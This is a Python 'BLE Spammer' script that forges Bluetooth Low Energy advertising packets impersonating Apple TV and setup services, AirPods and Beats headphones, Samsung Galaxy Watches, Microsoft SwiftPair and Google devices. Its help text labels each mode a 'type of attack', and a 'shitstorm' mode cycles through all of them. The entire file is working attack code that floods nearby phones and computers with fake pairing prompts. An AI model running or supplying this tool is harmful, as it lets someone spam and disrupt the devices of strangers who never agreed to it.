#!/usr/bin/env python3
# Author: Dmitry Chastuhin
# Twitter: https://twitter.com/_chipik

# web: https://hexway.io
# Twitter: https://twitter.com/_hexway

# 2024 edit + samsung + apple random + microsoft swift
# Pat (8L4CK)


import random
import hashlib
import argparse
from sys import exit
from time import sleep
from datetime import datetime
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)

# ============================== HELP
# -- HEADER
help_desc = '''
BLE Spammer

(c) 8L4CK 2024
-t:
    apple - Sends Apple BLE services data
    apple1
    airpods - Sends AirPods BLE data
    airpods1
    samsung - Sends Samsung Galaxy watch BLE data
    swift - Sends SwiftPair message
    google - Sends Google BLE data
    shitstorm - Send all
'''

# ============================== EOF HELP

parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-t', '--type', default="", type=str, help='type of attack')
parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
parser.add_argument('-s', '--sleep', default=1.0, type=float, help='Sleep between advertise')
parser.add_argument('-m', '--message', default='', type=str, help='Swift broadcast message')
parser.add_argument('-d', '--hcidev', default=0, type=int, help='HCI device index')
parser.add_argument('-n', '--index', default=-1, type=int, help='Apple/Samsung device index')

parser.add_argument('-l', '--list', action='store_true', help='list devices for samsung/apple/airpods')
parser.add_argument('-p', '--parsable', action='store_true', help='parsable list devices for samsung/apple/airpods')

parser.add_argument('-c', '--clear', action='store_true', help='clear advertise')

args = parser.parse_args()

if args.clear:
    print("Clear advertising on device %i" % args.hcidev)
    toggle_device(args.hcidev, True)
    try:
        sock = bluez.hci_open_dev(args.hcidev)
    except:
        print("Cannot open bluetooth device %i" % args.hcidev)
        raise
    start_le_advertising(sock, adv_type=0x03, min_interval=40, max_interval=args.interval, data=(0x00, 0x00))
    sleep(0.1)
    stop_le_advertising(sock)
    sleep(0.1)
    exit()

models = {
    "apple": [
    #(0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, SERVICE, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)
        (0x01, "AppleTV Setup"),
        (0x06, "AppleTV Pair"),
        (0x20, "AppleTV New User"),
        (0x2b, "AppleTV AppleID Setup"),
        (0xc0, "AppleTV Wireless Audio Sync"),
        (0x0d, "AppleTV Homekit Setup"),
        (0x13, "AppleTV Keyboard"),
        (0x27, "AppleTV 'Connecting to Network'"),
        (0x0b, "Homepod Setup"),
        (0x09, "Setup New Phone"),
        (0x02, "Transfer Number to New Phone"),
        (0x1e, "TV Color Balance"),
    ],
    "airpods": [
    #(0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, AIRPODS_MODEL, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
        (0x02, "Airpods"),
        (0x0e, "Airpods Pro"),
        (0x0a, "Airpods Max"),
        (0x0f, "Airpods Gen 2"),
        (0x13, "Airpods Gen 3"),
        (0x14, "Airpods Pro Gen 2"),
        (0x03, "PowerBeats"),
        (0x0b, "PowerBeats Pro"),
        (0x0c, "Beats Solo Pro"),
        (0x11, "Beats Studio Buds"),
        (0x10, "Beats Flex"),
        (0x05, "BeatsX"),
        (0x06, "Beats Solo3"),
        (0x09, "Beats Studio3"),
        (0x17, "Beats Studio Pro"),
        (0x12, "Beats Fit Pro"),
        (0x16, "Beats Studio Buds+"),
    ],
    "samsung": [
    #(0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, GALAXY_MODEL)
        (0x1A, "Fallback Watch"),
        (0x01, "White Watch4 Classic 44m"),
        (0x02, "Black Watch4 Classic 40m"),
        (0x03, "White Watch4 Classic 40m"),
        (0x04, "Black Watch4 44mm"),
        (0x05, "Silver Watch4 44mm"),
        (0x06, "Green Watch4 44mm"),
        (0x07, "Black Watch4 40mm"),
        (0x08, "White Watch4 40mm"),
        (0x09, "Gold Watch4 40mm"),
        (0x0A, "French Watch4"),
        (0x0B, "French Watch4 Classic"),
        (0x0C, "Fox Watch5 44mm"),
        (0x11, "Black Watch5 44mm"),
        (0x12, "Sapphire Watch5 44mm"),
        (0x13, "Purpleish Watch5 40mm"),
        (0x14, "Gold Watch5 40mm"),
        (0x15, "Black Watch5 Pro 45mm"),
        (0x16, "Gray Watch5 Pro 45mm"),
        (0x17, "White Watch5 44mm"),
        (0x18, "White & Black Watch5"),
        (0x1B, "Black Watch6 Pink 40mm"),
        (0x1C, "Gold Watch6 Gold 40mm"),
        (0x1D, "Silver Watch6 Cyan 44mm"),
        (0x1E, "Black Watch6 Classic 43m"),
        (0x20, "Green Watch6 Classic 43m"),
    ]
}

# print list
if args.list or args.parsable:
    # list apple services
    if args.type == "apple" or args.type == "":
        if args.type == "" and args.parsable == False:
            print("\n(-t apple) Apple services:")
        ai=0
        for code,apple in models.get("apple"):
            if args.parsable:
                print("apple;" + str(ai) + ";" + apple)
            else:
                print(str(ai) + ": " + apple)
            ai+=1
    # list apple airpods models
    if args.type == "airpods" or args.type == "":
        if args.type == "" and args.parsable == False:
            print("\n(-t airpods) Apple AirPods models:")
        ai=0
        for code, apple in models.get("airpods"):
            if args.parsable:
                print("airpods;" + str(ai) + ";" + apple)
            else:
                print(str(ai) + ": " + apple)
            ai+=1
    # list samsung watch
    if args.type == "samsung" or args.type == "":
        if args.type == "" and args.parsable == False:
            print("\n(-t samsung) Samsung Galaxy Watch models:")
        ai=0
        for code,watch in models.get("samsung"):
            if args.parsable:
                print("samsung;" + str(ai) + ";" + watch)
            else:
                print(str(ai) + ": " + watch)
            ai+=1
    exit()

rand = True

myTypes = ['apple', 'apple1', 'airpods', 'airpods1', 'samsung', 'swift', 'google', 'applejuice'];
shitstorm = False
shitstormI=0
if args.type not in myTypes: 
    if args.type == "shitstorm":
        shitstorm = True
    else:
        print("%s is unknown spam type" % args.type)
        exit()

msg = []
if args.message != '':
    msg = [ord(c) for c in args.message]
    rand = False

if args.index > -1:
    rand = False

applejuice = False
if args.type == "applejuice":
    args.sleep = 0.25
    applejuice = True



# =================================================================
packetTitle=''
packet=()
dev_id = args.hcidev  # the bluetooth device is hci0
toggle_device(dev_id, True)

try:
    sock = bluez.hci_open_dev(dev_id)
except:
    print("Cannot open bluetooth device %i" % dev_id)
    raise


if rand:
    print("Random mode...")
    while True:
        try:
            sock = bluez.hci_open_dev(dev_id)
        except:
            print("Cannot open bluetooth device %i" % dev_id)
            raise

        packetTitle=''
        packet=()
        if applejuice == True:
            args.type = ['apple', 'airpods', 'apple1', 'airpods1'][random.randint(0,3)]
        #==============================Packet creator...
        if shitstorm == True:
            args.type = myTypes[shitstormI]
            
        #-------- AppleJuice (Apple services)
        if args.type == "apple":
            #types = [ 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 ]
            select = random.choice(models.get("apple")) # [ 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 ]
            packetTitle = "AppleJuice: " + select[1]
            packet = (
                        16, # size
                        0xff, 0x4c, 0x00, 0x0f, 0x05, 0xc1, 
                        select[0], # type
                        random.randint(0, 255), 
                        random.randint(0, 255), 
                        random.randint(0, 255),
                        0x00, 0x00, 0x10,
                        random.randint(0, 255), 
                        random.randint(0, 255), 
                        random.randint(0, 255)
                    )
        
        #-------- AppleJuice (Apple services) - from table
        elif args.type == "apple1":
            r = random.randint(0, 11)
            packetTitle = "AppleJuice: " + models.get("apple")[r][1]
            packet = (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, models.get("apple")[r][0], 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)
        
        #-------- AairPods
        elif args.type == "airpods":
            r = random.randint(0, 16)
            packetTitle = "Airpods: " + models.get("airpods")[r][1]
            packet = (
                            0x1e, 0xff, 0x4c, 0x00, 0x07, # header
                             models.get("airpods")[r][0], # type // default 0x19
                            0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, # data
                            random.randint(1, 100), # left speaker
                            random.randint(1, 100), # right speaker
                            random.randint(128, 228), # case
                            0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a
                        )
        #-------- AairPods - from table
        elif args.type == "airpods1":
            r = random.randint(0, 16)
            packetTitle = "AirPods: " + models.get("airpods")[r][1]
            packet = packet = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, models.get("airpods")[r][0], 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

        #-------- Samsung Galaxy Watch
        elif args.type == "samsung":
            r = random.randint(0, 25)
            model = (models.get("samsung")[r][0] >> 0x00) & 0xFF
            packetTitle = "Samsung: " + models.get("samsung")[r][1]
            packet = (0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, model)
        #-------- Microsoft swift pair
        elif args.type == "swift":
            r0 = random.randint(65, 90)
            r1 = random.randint(65, 90)
            r2 = random.randint(65, 90)
            r3 = random.randint(65, 90)
            packetTitle="SwiftPair: "
            packetTitle+= chr(r0)
            packetTitle+= chr(r1)
            packetTitle+= chr(r2)
            packetTitle+= chr(r3)
            packet = (
                        0x0a,
                        0xff,0x06,0x00,0x03,0x00,0x80, # data
                        r0, r1, r2, r3
                    )
        #-------- Google ??
        elif args.type == "google": #
            #v1 = rand() % 100;         // v1 in the range 0 to 99
            #(rand() % 120) - 100
            signal = random.randint(0, 254)
            packetTitle="Google device"
            packet = (3, 0x03, 0x2c, 0xfe, 6, 0x16, 0x2c, 0xfe, 0x00, 0x92, 0xbb, 0xbd, 0x0a, signal )
        # ====== advertise data
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        print(current_time + " BLE: %s" % packetTitle)
        start_le_advertising(sock, adv_type=0x03, min_interval=40, max_interval=args.interval, data=packet)
        sleep(0.1)
        stop_le_advertising(sock)
        
        if shitstorm == True:
            shitstormI = random.randint(0, 6)

        
        sleep(args.sleep)
else:
    print("Static mode")
    try:
        #-------- SwiftPair message
        if args.type == "swift":
            packetTitle="SwiftPair: " + args.message
            packet = ( 7 + len(msg) - 1, )
            packet+= (0xff,0x06,0x00,0x03,0x00,0x80,) # data
            for m in msg:
                packet+=(m, )
        #-------- AppleJuice (Apple services) - from table
        elif args.type == "apple":
            packetTitle = "AppleJuice: " + models.get("apple")[args.index][1]
            packet = (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, models.get("apple")[args.index][0], 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)
        #-------- Samsung Galaxy Watch
        elif args.type == "samsung":
            model = (models.get("samsung")[args.index][0] >> 0x00) & 0xFF
            packetTitle = "Samsung: " + models.get("samsung")[args.index][1]
            packet = (0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, model)
        #-------- AairPods - from table
        elif args.type == "airpods":
            packetTitle = "AirPods: " + models.get("airpods")[args.index][1]
            packet = (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, models.get("airpods")[args.index][0], 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

                
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        print(current_time + " BLE: %s" % packetTitle)
        start_le_advertising(sock, adv_type=0x03, min_interval=40, max_interval=args.interval, data=packet)
        while True:
            sleep(2)
    except:
        stop_le_advertising(sock)
        raise
